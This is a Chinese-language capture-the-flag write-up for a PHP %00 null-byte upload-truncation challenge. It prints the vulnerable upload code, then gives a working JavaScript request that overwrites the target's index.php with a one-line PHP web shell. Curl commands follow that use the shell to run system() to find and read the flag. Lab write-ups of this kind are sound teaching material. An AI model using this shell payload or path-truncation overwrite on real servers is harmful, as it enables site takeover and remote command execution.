## 题目分析与源码审计
本关卡模拟的是 PHP 5.2 及以下版本存在的 `%00` 字符串截断漏洞。
上传文件后，回显页面没有直接给出文件路径。查看网页源代码，发现了后端处理的 PHP 核心逻辑：

php
$name = basename($_FILES['file']['name']);
$info = pathinfo($name);
$ext = $info['extension'];
$whitelist = array("jpg", "png", "gif");
if (in_array($ext, $whitelist)) {
    // 拼接保存路径：目录 + 随机数 + 时间 + 后缀
    $des = $_GET['road'] . "/" . rand(10, 99) . date("YmdHis") . "." . $ext;
    if (move_uploaded_file($_FILES['file']['tmp_name'], $des)) {
        echo "<script>alert('上传成功')</script>";
    } ...
}
### 漏洞分析：
1. 服务器允许用户通过 GET 参数 road 自定义上传目录。
2. 服务器强制将文件名重命名为 随机数+时间.jpg，导致即使上传成功也找不到文件名。
3. 底层 C 语言字符串处理函数在处理路径时，遇到空字节（\0 或 URL 编码的 %00）会认为字符串结束。利用这点可以截断后面的随机数，从而控制最终的文件名。

## 绕过过程与踩坑记录
利用这一漏洞时遇到了现代浏览器的严苛限制：
• 浏览器转义：使用 F12 控制台或 curl -F 发送带有 %00 的文件名时，现代浏览器或 HTTP 库会自动将其转义为 %2500 或过滤掉真正的空字节，导致截断失败。

## 伪造空字节与“偷家”覆盖
由于无法直接截断文件名，我们改变策略，利用 road 参数直接覆盖网站的首页文件（index.php）。
在靶场页面的控制台（Console）输入以下 JavaScript 代码，通过构造二进制报文强行发送 %00：
let filePayload = "<?php @eval($_POST['pass']);?>";
let boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW";

let bodyParts = [
    `--${boundary}\r\n`,
    `Content-Disposition: form-data; name="file"; filename="shell.jpg"\r\n`,
    `Content-Type: image/jpeg\r\n\r\n`,
    filePayload + `\r\n`,
    `--${boundary}\r\n`,
    `Content-Disposition: form-data; name="submit"\r\n\r\n`,
    `Submit\r\n`,
    `--${boundary}--\r\n`
];

let body = new TextEncoder().encode(bodyParts.join(""));
let xhr = new XMLHttpRequest();

// 核心：直接将保存路径强行指向 index.php，并用 %00 截断后面的随机数
xhr.open("POST", "http://靶场域名/?road=/var/www/html/index.php%00", true);
xhr.setRequestHeader("Content-Type", `multipart/form-data; boundary=${boundary}`);
xhr.send(body);
执行后，服务器的 index.php 被我们的一句话木马成功覆盖。
## 获取 Flag
由于首页已被替换为木马，直接向 index.php 发送 POST 请求即可执行命令：
### 查找 Flag：
curl -X POST "http://靶场域名/index.php" -d "pass=system('find / -name *flag*');"
### 读取 Flag：
curl -X POST "http://靶场域名/index.php" -d "pass=system('cat /var/www/html/flag_448122371.php');"

## 最终结果
成功获取 Flag：ctfhub{65a8816ab8e46fae7ae9996d}
